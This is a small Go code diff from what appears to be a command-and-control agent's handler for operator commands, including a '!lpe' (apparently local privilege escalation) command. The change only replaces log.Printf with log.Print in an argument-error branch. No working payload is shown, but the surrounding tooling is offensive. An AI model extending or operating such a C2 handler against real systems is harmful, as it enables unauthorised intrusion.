@@ -17,7 +17,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		// !lpe script_name
 		if len(cmdSlice) < 2 {
 			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
-			log.Printf(out)
+			log.Print(out)
 			return
 		}
 
